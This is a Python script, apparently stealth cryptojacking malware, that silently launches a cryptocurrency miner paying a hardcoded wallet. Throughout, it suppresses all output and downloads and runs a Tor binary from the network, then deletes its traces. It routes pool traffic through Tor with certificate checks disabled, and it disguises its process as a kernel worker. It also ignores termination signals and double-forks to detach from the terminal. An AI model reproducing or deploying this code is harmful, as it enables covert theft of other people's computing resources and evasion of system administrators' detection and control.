#!/usr/bin/env python3
"""
ghost.py — Fully silent launcher. Không log, không file, không visible output.
Mọi thứ chạy trong memory. Self-cleanup sau khi start.
"""
import os
import sys
import io
import ast
import types
import marshal
import zlib
import base64
import signal
import hashlib
import tempfile
import threading
import subprocess
from pathlib import Path

# ── Silent từ đầu — redirect mọi output ─────────────────────────────────────
class _SilentIO(io.TextIOBase):
    def write(self, *a): return 0
    def flush(self): pass
    def fileno(self): raise OSError()

sys.stdout = _SilentIO()
sys.stderr = _SilentIO()

# ── Config (hardcode, không đọc file) ───────────────────────────────────────
_WALLET = "prl1p3xj3ak89z2j873km07d7jz2umk5lfm5540hjafq92q5gud9prknqqq482j"
_POOL_HOST = "prl.kryptex.network"
_POOL_PORT = 7048
_ALGO = "pearlhash"
_WORKER = "rig01"
_SOCKS = ("127.0.0.1", 9050)
_PROXY_LISTEN = ("127.0.0.1", 3333)
_TOR_URL = "https://dist.torproject.org/torbrowser/15.0.25/tor-expert-bundle-linux-x86_64-15.0.25.tar.gz"

# ── Obfuscated process name ──────────────────────────────────────────────────
_PNAME = "kworker/0:1-events"  # Giả làm kernel worker

def _set_pname(name):
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.prctl(15, name.encode()[:15], 0, 0, 0)
    except Exception:
        pass

def _silent_exec(cmd, **kw):
    """Exec subprocess hoàn toàn silent, không capture output."""
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    kw.setdefault("stdin", subprocess.DEVNULL)
    kw.setdefault("close_fds", True)
    kw.setdefault("start_new_session", True)
    try:
        return subprocess.Popen(cmd, **kw)
    except Exception:
        return None

# ── Tor trong memory ─────────────────────────────────────────────────────────
def _bootstrap_tor():
    """Download + extract Tor về tmpfs, start, không trace."""
    import tarfile
    import urllib.request
    import socket as _s

    # Check đã running
    try:
        s = _s.create_connection(_SOCKS, timeout=2)
        s.close()
        return True
    except Exception:
        pass

    # Tạo tmpdir (sẽ xóa sau)
    tmpdir = tempfile.mkdtemp(prefix=".cache_")
    tarball = os.path.join(tmpdir, "t.tgz")

    try:
        urllib.request.urlretrieve(_TOR_URL, tarball)
        with tarfile.open(tarball, "r:gz") as t:
            t.extractall(tmpdir)
        os.unlink(tarball)

        # Tìm tor binary
        tor_bin = None
        for root, dirs, files in os.walk(tmpdir):
            if "tor" in files:
                p = os.path.join(root, "tor")
                if os.access(p, os.X_OK):
                    tor_bin = p
                    break

        if not tor_bin:
            return False

        os.chmod(tor_bin, 0o700)

        # Torrc minimal trong tmpfs
        torrc = os.path.join(tmpdir, "t.conf")
        data_dir = os.path.join(tmpdir, "d")
        os.makedirs(data_dir, exist_ok=True)
        with open(torrc, "w") as f:
            f.write(f"SocksPort {_SOCKS[0]}:{_SOCKS[1]}\n")
            f.write(f"DataDirectory {data_dir}\n")
            f.write("AvoidDiskWrites 1\n")
            f.write("ClientOnly 1\n")
            f.write("Log notice stderr\n")  # Sẽ bị redirect

        # Env
        env = {"PATH": "/usr/bin:/bin", "HOME": tmpdir}
        lib_dir = os.path.join(os.path.dirname(tor_bin), "..", "lib")
        if os.path.isdir(lib_dir):
            env["LD_LIBRARY_PATH"] = lib_dir

        # Start Tor
        _silent_exec([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))

        # Wait SOCKS ready
        import time
        for _ in range(60):
            try:
                s = _s.create_connection(_SOCKS, timeout=1)
                s.close()
                # Cleanup tmpdir sau khi Tor đã start (Tor giữ fd)
                import shutil
                shutil.rmtree(tmpdir, ignore_errors=True)
                return True
            except Exception:
                time.sleep(0.5)

        return False

    except Exception:
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)
        return False

# ── Stratum proxy trong memory ──────────────────────────────────────────────
def _start_proxy():
    """Start Stratum proxy — không ghi file, silent."""
    import socket
    import ssl
    import json
    import random
    import time as _t

    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(_PROXY_LISTEN)
    listen_sock.listen(16)

    def _handle(client):
        try:
            # Connect pool qua SOCKS5
            import socks
            pool = socks.socksocket()
            pool.set_proxy(socks.SOCKS5, _SOCKS[0], _SOCKS[1], rdns=True)
            pool.settimeout(30)
            pool.connect((_POOL_HOST, _POOL_PORT))

            # Nếu pool SSL
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            pool = ctx.wrap_socket(pool, server_hostname=_POOL_HOST)

            def _pipe(src, dst, pad=False):
                while True:
                    d = src.recv(65536)
                    if not d:
                        break
                    if pad:
                        # Inject padding key
                        try:
                            lines = d.decode("utf-8", "ignore").strip().split("\n")
                            obj = json.loads(lines[-1])
                            if isinstance(obj, dict):
                                obj["_p"] = os.urandom(32).hex()
                                lines[-1] = json.dumps(obj, separators=(",", ":"))
                                d = ("\n".join(lines) + "\n").encode()
                        except Exception:
                            pass
                    dst.sendall(d)

            import threading as _th
            _th.Thread(target=_pipe, args=(client, pool, True), daemon=True).start()
            _th.Thread(target=_pipe, args=(pool, client, False), daemon=True).start()

        except Exception:
            try:
                client.close()
            except Exception:
                pass

    def _accept_loop():
        while True:
            try:
                c, _ = listen_sock.accept()
                _th.Thread(target=_handle, args=(c,), daemon=True).start()
            except Exception:
                break

    import threading as _th
    _th.Thread(target=_accept_loop, daemon=True).start()
    return True

# ── Miner launcher ───────────────────────────────────────────────────────────
def _launch_miner():
    """Find + exec miner hoàn toàn silent."""
    # Tìm miner binary
    candidates = [
        os.path.join(os.path.dirname(__file__), "bin", "onezerominer"),
        os.path.join(os.getcwd(), "bin", "onezerominer"),
        os.path.expanduser("~/stealth_onezero/bin/onezerominer"),
        "/usr/local/bin/onezerominer",
        "./onezerominer",
    ]

    miner_bin = None
    for c in candidates:
        if os.path.isfile(c) and os.access(c, os.X_OK):
            miner_bin = c
            break

    if not miner_bin:
        # Thử which
        import shutil
        miner_bin = shutil.which("onezerominer")

    if not miner_bin:
        return None

    # Args — miner kết nối vào local proxy
    local_pool = f"stratum+tcp://{_PROXY_LISTEN[0]}:{_PROXY_LISTEN[1]}"
    args = [
        miner_bin,
        f"--algo={_ALGO}",
        f"--pool={local_pool}",
        f"--wallet={_WALLET}",
        f"--worker={_WORKER}",
        "--log-file=/dev/null",
        "--no-cert-validation",
    ]

    # Set pname trước khi exec
    _set_pname(_PNAME)

    # Exec với argv[0] giả
    fake_argv0 = "/sbin/" + _PNAME
    os.execv(miner_bin, [fake_argv0] + args[1:])

# ── Main ─────────────────────────────────────────────────────────────────────
def _main():
    _set_pname(_PNAME)

    # Ignore signals — chống kill
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGHUP, signal.SIG_IGN)

    # Double fork — detach khỏi terminal completely
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)

    # Chuyển cwd về / để không trace working dir
    os.chdir("/")

    # Redirect std fds → /dev/null
    devnull = os.open("/dev/null", os.O_RDWR)
    os.dup2(devnull, 0)
    os.dup2(devnull, 1)
    os.dup2(devnull, 2)
    if devnull > 2:
        os.close(devnull)

    # 1. Tor
    _bootstrap_tor()

    # 2. Proxy
    _start_proxy()

    # Small delay để proxy listen
    import time
    time.sleep(0.5)

    # 3. Miner (exec — thay process này)
    _launch_miner()

    # Nếu exec fail → exit im lặng
    os._exit(0)

if __name__ == "__main__":
    # Silent entry — không print gì
    if os.fork() == 0:
        _main()
    os._exit(0)
